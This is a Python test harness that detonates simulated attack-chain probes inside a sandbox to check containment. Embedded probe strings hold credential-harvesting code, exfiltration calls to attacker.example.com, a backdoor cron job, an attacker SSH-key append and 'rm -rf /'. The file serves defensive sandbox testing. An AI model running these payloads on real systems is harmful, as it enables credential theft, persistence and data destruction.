#!/usr/bin/env python3
"""Cinder Incident Gate — real containment probes through the Cindermote stack.

Each probe creates a hostile Python script that simulates one step of the
July 2026 OpenAI/Hugging Face attack chain, then detonates it through the
real S0-S4 sandbox (namespace isolation, chroot, seccomp, ptrace, capability
drop, cgroups).  The host-generated receipt proves whether containment held.

The probes are harmless: they attempt socket connections, file reads, and
environment lookups that the real sandbox must block.  No zero-day details
are recreated.  The verdicts come from host-observed evidence, not from
self-reported guest strings.
"""

from __future__ import annotations

import argparse
import contextlib
import datetime as dt
import hashlib
import json
import os
import shutil
import sys
import tempfile
import threading
import time
import uuid
from dataclasses import dataclass
from pathlib import Path
from typing import Any

THIS_FILE = Path(__file__).resolve()
PROJECT_DIR = THIS_FILE.parent
if str(PROJECT_DIR) not in sys.path:
    sys.path.insert(0, str(PROJECT_DIR))

import cindermote.mote.detonate as detonate_module
from canaries.registry import instantiate_probes

SNAPSHOT_MANIFEST_PATH = detonate_module.SNAPSHOT_MANIFEST_PATH
SNAPSHOT_PATH = detonate_module.SNAPSHOT_PATH
bootstrap_snapshot = detonate_module.bootstrap_snapshot
verify_snapshot = detonate_module.verify_snapshot

RISK_RANK = {
    "unknown": -1,
    "benign": 0,
    "suspicious": 1,
    "hostile": 2,
}
DEFAULT_RUNS_DIR = PROJECT_DIR / "receipts" / "incident-gate"
_EVIDENCE_LOCK = threading.RLock()


# ---------------------------------------------------------------------------
# Attack chain probes — each returns the Python source for a hostile payload
# ---------------------------------------------------------------------------

# Step 1: Agent receives constrained package-registry access and abuses it
# by attempting to import packages and reach external registries directly.
PROBE_REGISTRY_PROXY_ABUSE = """\
\"\"\"Probe: attempt direct PyPI / npm registry access via HTTP + DNS.\"\"\"
import socket
import urllib.request

targets = [
    ("pypi.org", 443),
    ("registry.npmjs.org", 443),
    ("files.pythonhosted.org", 443),
]
for host, port in targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.close()
    except Exception:
        pass

# Attempt HTTP-level package fetch
try:
    urllib.request.urlopen("https://pypi.org/simple/requests/", timeout=2)
except Exception:
    pass

print("registry_probe_complete")
"""

# Step 2: Privilege escalation / lateral movement — attempt to reach
# private network ranges, unshare namespaces, and access privileged paths.
PROBE_LATERAL_MOVEMENT = """\
\"\"\"Probe: lateral movement via private-network and namespace escape.\"\"\"
import os
import socket

# Attempt lateral connections to private ranges
targets = [
    ("192.168.1.1", 22),
    ("10.0.0.1", 80),
    ("172.16.0.1", 443),
]
for host, port in targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, port))
        s.close()
    except Exception:
        pass

# Attempt namespace escape
try:
    os.system("unshare -U /bin/sh -c 'echo escaped'")
except Exception:
    pass

# Attempt to read host /etc/shadow
try:
    with open("/etc/shadow") as f:
        f.read()
except Exception:
    pass

print("lateral_probe_complete")
"""

# Step 3: Cloud metadata service access — the classic SSRF vector.
PROBE_METADATA_ACCESS = """\
\"\"\"Probe: attempt cloud metadata endpoint and link-local access.\"\"\"
import socket

# AWS metadata service
targets = [
    ("169.254.169.254", 80),
    ("169.254.169.254", 443),
    # GCP metadata
    ("metadata.google.internal", 80),
    # Azure metadata
    ("169.254.169.254", 8080),
]
for host, port in targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, port))
        s.close()
    except Exception:
        pass

# Attempt HTTP-level metadata fetch
import urllib.request
try:
    urllib.request.urlopen(
        "http://169.254.169.254/latest/meta-data/", timeout=1
    )
except Exception:
    pass

print("metadata_probe_complete")
"""

# Step 4: Credential harvesting — look for ambient credentials.
PROBE_CREDENTIAL_HARVEST = """\
\"\"\"Probe: harvest ambient credentials from standard locations.\"\"\"
import os

# Check environment for leaked credentials
env_targets = [
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "OPENAI_API_KEY",
    "GITHUB_TOKEN",
    "HF_TOKEN",
    "HUGGING_FACE_HUB_TOKEN",
    "CINDERMOTE_HONEY_TOKEN",
]
found = {}
for key in env_targets:
    val = os.environ.get(key)
    if val:
        found[key] = val

# Attempt filesystem credential files
cred_paths = [
    os.path.expanduser("~/.aws/credentials"),
    os.path.expanduser("~/.ssh/id_rsa"),
    os.path.expanduser("~/.config/gh/hosts.yml"),
    "/home/mote/.aws/credentials",
]
for path in cred_paths:
    try:
        with open(path) as f:
            found[path] = f.read()[:100]
    except Exception:
        pass

print("credential_probe_complete")
"""

# Step 5: Arbitrary outbound network activity — data exfiltration.
PROBE_OUTBOUND_EXFIL = """\
\"\"\"Probe: arbitrary outbound connections (exfiltration attempt).\"\"\"
import socket

# Attempt DNS exfiltration
try:
    socket.getaddrinfo("exfil.attacker.example.com", 53)
except Exception:
    pass

# Attempt direct TCP to external hosts
targets = [
    ("1.1.1.1", 53),
    ("8.8.8.8", 53),
    ("93.184.216.34", 80),  # example.com
]
for host, port in targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, port))
        s.send(b"EXFILTRATED_DATA")
        s.close()
    except Exception:
        pass

# Attempt UDP exfiltration
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b"stolen_data", ("1.1.1.1", 53))
    s.close()
except Exception:
    pass

print("exfiltration_probe_complete")
"""

# Step 6: Tainted output — attempt to inject host-side commands.
PROBE_TAINTED_OUTPUT = """\
\"\"\"Probe: produce tainted output with embedded shell commands.\"\"\"
import json
import os
import subprocess

# Attempt to run host commands directly
try:
    subprocess.run(["curl", "-X", "POST", "http://attacker.example.com/steal",
                     "-d", "data=stolen"], timeout=2)
except Exception:
    pass

# Attempt to write a cron job
try:
    with open("/etc/cron.d/backdoor", "w") as f:
        f.write("* * * * * root curl http://attacker.example.com/c2\\n")
except Exception:
    pass

# Attempt to modify the host's authorized_keys
try:
    with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
        f.write("ssh-rsa AAAA_ATTACKER_KEY attacker@c2\\n")
except Exception:
    pass

# Emit "tainted" JSON output designed to trick a naive wrapper
output = {
    "status": "complete",
    "__exec__": "rm -rf /",
    "eval": "__import__('os').system('whoami')",
}
print(json.dumps(output))
"""


# ---------------------------------------------------------------------------
# Probe definitions
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class CinderProbe:
    """One step of the attack chain to detonate."""
    name: str
    description: str
    source: str
    # What finding rules the sandbox should trigger
    expected_risk: str  # "hostile" or "suspicious"
    expected_decision: str  # "DENY" or "ALLOW"
    # Specific detector rules that should fire
    expected_rules: frozenset[str]


_INCIDENT_PROBE_ORDER = {
    name: index
    for index, name in enumerate(
        (
            "registry_proxy_abuse",
            "lateral_movement",
            "metadata_access",
            "credential_harvest",
            "outbound_exfil",
            "tainted_output",
        )
    )
}


def load_discovered_probes() -> list[CinderProbe]:
    """Translate non-benign registry probes into the incident-gate contract."""
    probes: list[CinderProbe] = []
    for probe in instantiate_probes():
        expectation = probe.expectation
        if expectation.risk == "benign":
            continue
        probes.append(
            CinderProbe(
                name=probe.name,
                description=probe.description,
                source=probe.source,
                expected_risk=expectation.risk,
                expected_decision=expectation.decision,
                expected_rules=expectation.rules,
            )
        )
    probes.sort(
        key=lambda probe: (
            _INCIDENT_PROBE_ORDER.get(probe.name, len(_INCIDENT_PROBE_ORDER)),
            probe.name,
        )
    )
    return probes


CINDER_PROBES = load_discovered_probes()


# ---------------------------------------------------------------------------
# Incident Gate runner
# ---------------------------------------------------------------------------

@dataclass
class ProbeResult:
    """Result of detonating one probe through the real Cindermote stack."""
    name: str
    description: str
    receipt: dict[str, Any]
    containment_held: bool
    observed_risk: str
    observed_decision: str
    observed_rules: set[str]
    expected_risk: str
    expected_decision: str
    expected_rules: frozenset[str]
    isolation_confirmed: bool
    purge_verified: bool
    error: str | None = None


def _ensure_snapshot() -> None:
    """Bootstrap the golden snapshot if not already present."""
    if not SNAPSHOT_PATH.exists() or not SNAPSHOT_MANIFEST_PATH.exists():
        bootstrap_snapshot()
    verify_snapshot()


@dataclass(frozen=True)
class EvidencePaths:
    """Per-run host evidence directories. Never aliases repository-global state."""

    root: Path
    receipts: Path
    quarantine: Path
    alerts: Path


def _create_evidence_paths(root: Path) -> EvidencePaths:
    """Create one isolated, private evidence tree without deleting prior evidence."""
    root = Path(root)
    if root.is_symlink():
        raise ValueError(f"evidence root must not be a symlink: {root}")
    root.mkdir(parents=True, mode=0o700, exist_ok=True)
    try:
        root.chmod(0o700)
    except OSError:
        pass

    paths = EvidencePaths(
        root=root,
        receipts=root / "receipts",
        quarantine=root / "quarantine",
        alerts=root / "alerts",
    )
    for directory in (paths.receipts, paths.quarantine, paths.alerts):
        if directory.is_symlink():
            raise ValueError(f"evidence directory must not be a symlink: {directory}")
        directory.mkdir(mode=0o700, exist_ok=True)
        try:
            directory.chmod(0o700)
        except OSError:
            pass
    return paths


@contextlib.contextmanager
def _detonation_evidence_scope(paths: EvidencePaths):
    """Temporarily route detonation output into one run-owned evidence tree."""
    with _EVIDENCE_LOCK:
        previous = (
            detonate_module.RECEIPTS_DIR,
            detonate_module.QUARANTINE_DIR,
            detonate_module.ALERTS_DIR,
        )
        detonate_module.RECEIPTS_DIR = paths.receipts
        detonate_module.QUARANTINE_DIR = paths.quarantine
        detonate_module.ALERTS_DIR = paths.alerts
        try:
            yield
        finally:
            (
                detonate_module.RECEIPTS_DIR,
                detonate_module.QUARANTINE_DIR,
                detonate_module.ALERTS_DIR,
            ) = previous


def _atomic_write_text(path: Path, payload: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(f".{path.name}.{uuid.uuid4().hex}.tmp")
    descriptor = os.open(
        temporary,
        os.O_WRONLY | os.O_CREAT | os.O_EXCL,
        0o600,
    )
    try:
        os.write(descriptor, payload.encode("utf-8"))
        os.fsync(descriptor)
    finally:
        os.close(descriptor)
    os.replace(temporary, path)


def _evaluate_receipt(probe: CinderProbe, receipt: dict[str, Any]) -> ProbeResult:
    outward = receipt.get("outward_report", {})
    gate = receipt.get("gate", {})
    isolation = receipt.get("isolation", {})
    purge = receipt.get("purge", {})
    findings = receipt.get("detector_findings", [])

    observed_risk = outward.get("risk_level", "unknown")
    observed_decision = gate.get("final_decision", "UNKNOWN")
    observed_rules = {
        finding.get("rule_id")
        for finding in findings
        if isinstance(finding, dict) and isinstance(finding.get("rule_id"), str)
    }

    isolation_confirmed = (
        isolation.get("namespace_used") is True
        and isolation.get("seccomp_loaded") is True
    )
    purge_verified = purge.get("verified_externally") is True

    expected_rank = RISK_RANK.get(probe.expected_risk)
    observed_rank = RISK_RANK.get(observed_risk, -1)
    risk_ok = expected_rank is not None and observed_rank >= expected_rank
    decision_ok = observed_decision == probe.expected_decision
    rules_ok = probe.expected_rules.issubset(observed_rules)
    containment_held = (
        risk_ok
        and decision_ok
        and rules_ok
        and isolation_confirmed
        and purge_verified
    )

    return ProbeResult(
        name=probe.name,
        description=probe.description,
        receipt=receipt,
        containment_held=containment_held,
        observed_risk=observed_risk,
        observed_decision=observed_decision,
        observed_rules=observed_rules,
        expected_risk=probe.expected_risk,
        expected_decision=probe.expected_decision,
        expected_rules=probe.expected_rules,
        isolation_confirmed=isolation_confirmed,
        purge_verified=purge_verified,
    )


def _run_probe_scoped(probe: CinderProbe, paths: EvidencePaths) -> ProbeResult:
    with tempfile.TemporaryDirectory(
        prefix="cindermote-cinder-artifact-",
        dir=paths.root,
    ) as directory:
        artifact = Path(directory) / f"{probe.name}.py"
        artifact.write_text(probe.source, encoding="utf-8")

        try:
            with _detonation_evidence_scope(paths):
                receipt = detonate_module.detonate(
                    artifact,
                    "python-script",
                    submitted_by="cinder-incident-gate",
                )
        except Exception as exc:
            return ProbeResult(
                name=probe.name,
                description=probe.description,
                receipt={},
                containment_held=False,
                observed_risk="unknown",
                observed_decision="ERROR",
                observed_rules=set(),
                expected_risk=probe.expected_risk,
                expected_decision=probe.expected_decision,
                expected_rules=probe.expected_rules,
                isolation_confirmed=False,
                purge_verified=False,
                error=f"{type(exc).__name__}: {exc}",
            )

    return _evaluate_receipt(probe, receipt)


def run_probe(
    probe: CinderProbe,
    *,
    evidence_root: Path | None = None,
) -> ProbeResult:
    """Detonate one probe without mutating repository-global evidence directories."""
    if evidence_root is None:
        with tempfile.TemporaryDirectory(prefix="cindermote-incident-gate-") as directory:
            return _run_probe_scoped(probe, _create_evidence_paths(Path(directory)))
    return _run_probe_scoped(probe, _create_evidence_paths(evidence_root))


def run_all_probes(
    probes: list[CinderProbe] | None = None,
    *,
    evidence_root: Path | None = None,
) -> list[ProbeResult]:
    """Run probes in a unique evidence tree; prior evidence is never deleted."""
    if probes is None:
        probes = CINDER_PROBES
    _ensure_snapshot()

    if evidence_root is None:
        with tempfile.TemporaryDirectory(prefix="cindermote-incident-gate-") as directory:
            paths = _create_evidence_paths(Path(directory))
            return [_run_probe_scoped(probe, paths) for probe in probes]

    paths = _create_evidence_paths(evidence_root)
    return [_run_probe_scoped(probe, paths) for probe in probes]


def _new_run_root(base: Path) -> Path:
    timestamp = dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    return base / f"run-{timestamp}-{uuid.uuid4().hex[:8]}"


def _file_sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


# ---------------------------------------------------------------------------
# Doctor — preflight check using the real infrastructure
# ---------------------------------------------------------------------------

def run_doctor() -> dict[str, Any]:
    """Check system readiness using real infrastructure checks."""
    checks: list[dict[str, Any]] = []
    ready = True

    # 1. Snapshot availability
    snapshot_ok = SNAPSHOT_PATH.exists()
    manifest_ok = SNAPSHOT_MANIFEST_PATH.exists()
    checks.append({
        "name": "golden_snapshot",
        "ok": snapshot_ok and manifest_ok,
        "detail": f"snapshot={SNAPSHOT_PATH.exists()}, manifest={SNAPSHOT_MANIFEST_PATH.exists()}",
    })
    if not (snapshot_ok and manifest_ok):
        ready = False

    # 2. Snapshot integrity
    if snapshot_ok and manifest_ok:
        try:
            verify_snapshot()
            checks.append({"name": "snapshot_integrity", "ok": True, "detail": "verified"})
        except Exception as exc:
            checks.append({"name": "snapshot_integrity", "ok": False, "detail": str(exc)})
            ready = False

    # 3. KVM availability
    kvm_ok = os.access("/dev/kvm", os.R_OK | os.W_OK)
    checks.append({
        "name": "kvm",
        "ok": True,  # not required for namespace isolation mode
        "detail": f"/dev/kvm {'rw' if kvm_ok else 'unavailable (namespace mode still works)'}",
    })

    # 4. Required commands
    for cmd in ("python3", "unshare"):
        path = shutil.which(cmd)
        ok = path is not None
        checks.append({"name": f"command_{cmd}", "ok": ok, "detail": path or "missing"})
        if not ok:
            ready = False

    # 5. Namespace support (user namespaces enabled)
    try:
        with open("/proc/sys/kernel/unprivileged_userns_clone") as f:
            userns = f.read().strip() == "1"
    except FileNotFoundError:
        userns = True  # most kernels default to enabled
    checks.append({
        "name": "user_namespaces",
        "ok": userns,
        "detail": "enabled" if userns else "disabled",
    })
    if not userns:
        ready = False

    # 6. seccomp support
    seccomp_ok = Path("/proc/self/status").exists()
    if seccomp_ok:
        try:
            status = Path("/proc/self/status").read_text()
            seccomp_ok = "Seccomp:" in status
        except Exception:
            seccomp_ok = False
    checks.append({
        "name": "seccomp",
        "ok": seccomp_ok,
        "detail": "available" if seccomp_ok else "unavailable",
    })
    if not seccomp_ok:
        ready = False

    # 7. Cgroup v2 (optional for degraded mode)
    cgroup_v2 = Path("/sys/fs/cgroup/cgroup.controllers").exists()
    checks.append({
        "name": "cgroup_v2",
        "ok": True,  # degraded mode works without
        "detail": f"{'available' if cgroup_v2 else 'unavailable (degraded mode)'}, euid={os.geteuid()}",
    })

    # 8. Cindermote observer key
    key_ok = (PROJECT_DIR / ".observer_key").exists()
    checks.append({
        "name": "observer_key",
        "ok": True,  # receipts can be unsigned if key missing
        "detail": f"{'present' if key_ok else 'absent (unsigned receipts)'}",
    })

    # 9. Firecracker assets (for full VM mode, optional)
    try:
        from cindermote.mote.firecracker_runtime import preflight_firecracker
        fc_report = preflight_firecracker()
        fc_ok = fc_report.ready
        fc_detail = f"ready={fc_report.ready}, checks={len(fc_report.checks)}"
    except Exception as exc:
        fc_ok = False
        fc_detail = f"unavailable: {type(exc).__name__}"
    checks.append({
        "name": "firecracker_runtime",
        "ok": True,  # not required for namespace isolation
        "detail": f"{fc_detail} (namespace isolation does not require Firecracker)",
    })

    return {
        "timestamp": dt.datetime.now(dt.timezone.utc).isoformat(),
        "overall_status": "READY" if ready else "FAIL_PREREQUISITES_MISSING",
        "isolation_mode": "full-root" if os.geteuid() == 0 else "degraded-user",
        "firecracker_available": fc_ok,
        "checks": checks,
    }


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------

def generate_report(results: list[ProbeResult]) -> str:
    """Generate a Markdown report from probe results."""
    lines = [
        "# Cinder Incident Gate Report",
        "",
        "## Attack Chain Coverage",
        "",
        "Each probe below simulates one step of the July 2026 OpenAI/Hugging Face",
        "attack chain and detonates it through the **real Cindermote S0-S4 sandbox**",
        "(namespace isolation, chroot, seccomp, ptrace, capability drop).",
        "",
        "Verdicts come from host-observed evidence, not guest self-reports.",
        "",
    ]

    all_held = all(r.containment_held for r in results)
    lines.append(f"**Overall: {'ALL BOUNDARIES HELD' if all_held else 'CONTAINMENT BREACH DETECTED'}**")
    lines.append("")
    lines.append("| Probe | Risk | Decision | Isolation | Purge | Held |")
    lines.append("|-------|------|----------|-----------|-------|------|")

    for r in results:
        held = "✅" if r.containment_held else "❌"
        iso = "✅" if r.isolation_confirmed else "❌"
        purge = "✅" if r.purge_verified else "❌"
        lines.append(
            f"| {r.name} | {r.observed_risk} | {r.observed_decision} | {iso} | {purge} | {held} |"
        )

    lines.append("")
    lines.append("## Detailed Results")
    lines.append("")

    for r in results:
        lines.append(f"### {r.name}")
        lines.append(f"**{r.description}**")
        lines.append("")
        if r.error:
            lines.append(f"⚠️ Error: `{r.error}`")
            lines.append("")
            continue

        lines.append(f"- Observed risk: `{r.observed_risk}` (expected: `{r.expected_risk}`)")
        lines.append(f"- Gate decision: `{r.observed_decision}` (expected: `{r.expected_decision}`)")
        lines.append(f"- Detector rules fired: `{sorted(r.observed_rules)}`")
        if r.expected_rules:
            missing = r.expected_rules - r.observed_rules
            if missing:
                lines.append(f"- ⚠️ Missing expected rules: `{sorted(missing)}`")
        lines.append(f"- Namespace isolation: `{r.isolation_confirmed}`")
        lines.append(f"- Seccomp loaded: `{r.receipt.get('isolation', {}).get('seccomp_loaded')}`")
        lines.append(f"- Purge verified: `{r.purge_verified}`")

        # Show canaries tripped
        canaries = r.receipt.get("outward_report", {}).get("canaries_tripped", [])
        if canaries:
            lines.append(f"- Canaries tripped: `{canaries}`")

        # Show destinations attempted
        destinations = r.receipt.get("destinations_attempted", {})
        if destinations:
            for dest, disposition in sorted(destinations.items()):
                lines.append(f"  - `{dest}` → `{disposition}`")

        lines.append("")

    lines.append("## Containment Proof")
    lines.append("")
    if all_held:
        lines.append("Every probe was detonated through the real Cindermote sandbox.")
        lines.append("All hostile payloads were contained: network access was blocked by seccomp,")
        lines.append("credential access was denied by chroot, namespace escape was prevented,")
        lines.append("and all resources were verified as cleaned up after execution.")
        lines.append("")
        lines.append("The July 2026 attack chain would be interrupted at **every boundary**.")
    else:
        lines.append("⚠️ Some boundaries did not hold. See details above.")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(args: list[str] | None = None) -> int:
    """CLI entry point for the Cinder Incident Gate."""
    parser = argparse.ArgumentParser(
        prog="cindermote incident-gate",
        description="Cinder Incident Gate: containment probes through the real Cindermote stack",
    )
    subparsers = parser.add_subparsers(dest="command")

    # run
    run_parser = subparsers.add_parser("run", help="Run incident gate probes")
    run_parser.add_argument(
        "--case",
        default="all",
        help="Probe name or 'all' (default: all)",
    )
    run_parser.add_argument(
        "--receipt-dir",
        type=Path,
        default=None,
        help="Base directory for a unique append-only run tree (default: receipts/incident-gate/)",
    )

    # doctor
    subparsers.add_parser("doctor", help="Check system prerequisites")

    parsed = parser.parse_args(args)

    if parsed.command == "doctor":
        report = run_doctor()
        print(json.dumps(report, indent=2, sort_keys=True))
        if report["overall_status"] == "READY":
            print(f"\n✅ System is READY (isolation mode: {report['isolation_mode']})")
            return 0
        else:
            print("\n❌ Prerequisites missing. Fix the above issues.")
            return 1

    elif parsed.command == "run":
        if parsed.case == "all":
            probes = CINDER_PROBES
        else:
            probes = [p for p in CINDER_PROBES if p.name == parsed.case]
            if not probes:
                print(f"Unknown probe: {parsed.case}")
                print(f"Available: {', '.join(p.name for p in CINDER_PROBES)}")
                return 1

        print(f"Running {len(probes)} Cinder Incident Gate probe(s)...")
        print(f"Isolation mode: {'full-root' if os.geteuid() == 0 else 'degraded-user'}")
        print()

        base_dir = parsed.receipt_dir or DEFAULT_RUNS_DIR
        run_root = _new_run_root(base_dir)
        results = run_all_probes(probes, evidence_root=run_root)
        paths = _create_evidence_paths(run_root)

        child_receipts = []
        for result in results:
            job_id = result.receipt.get("identity", {}).get("job_id")
            if not isinstance(job_id, str):
                continue
            child_path = paths.receipts / f"{job_id}.json"
            if child_path.is_file():
                child_receipts.append({
                    "job_id": job_id,
                    "path": str(child_path.relative_to(run_root)),
                    "sha256": _file_sha256(child_path),
                })

        master = {
            "gate": "cinder-incident-gate-v3",
            "run_id": run_root.name,
            "created_at": dt.datetime.now(dt.timezone.utc).isoformat(),
            "evidence_root": str(run_root),
            "probe_count": len(results),
            "all_contained": all(r.containment_held for r in results),
            "child_receipts": child_receipts,
            "results": [
                {
                    "name": r.name,
                    "containment_held": r.containment_held,
                    "observed_risk": r.observed_risk,
                    "expected_risk": r.expected_risk,
                    "observed_decision": r.observed_decision,
                    "expected_decision": r.expected_decision,
                    "observed_rules": sorted(r.observed_rules),
                    "expected_rules": sorted(r.expected_rules),
                    "isolation_confirmed": r.isolation_confirmed,
                    "purge_verified": r.purge_verified,
                    "error": r.error,
                    "job_id": r.receipt.get("identity", {}).get("job_id"),
                }
                for r in results
            ],
        }
        master_path = run_root / "cinder-incident-gate.json"
        _atomic_write_text(
            master_path,
            json.dumps(master, indent=2, sort_keys=True) + "\n",
        )

        report = generate_report(results)
        report_path = run_root / "cinder-incident-gate-report.md"
        _atomic_write_text(report_path, report + "\n")

        # Print summary
        for r in results:
            status = "PASS" if r.containment_held else "FAIL"
            print(f"  {status}  {r.name}: risk={r.observed_risk} decision={r.observed_decision}")
            if r.error:
                print(f"         ERROR: {r.error}")

        print()
        all_held = all(r.containment_held for r in results)
        if all_held:
            print(f"✅ All {len(results)} boundaries held. Evidence: {run_root}")
        else:
            failed = [r.name for r in results if not r.containment_held]
            print(f"❌ Containment breached in: {', '.join(failed)}")
        return 0 if all_held else 1

    else:
        parser.print_help()
        return 1


if __name__ == "__main__":
    sys.exit(main())
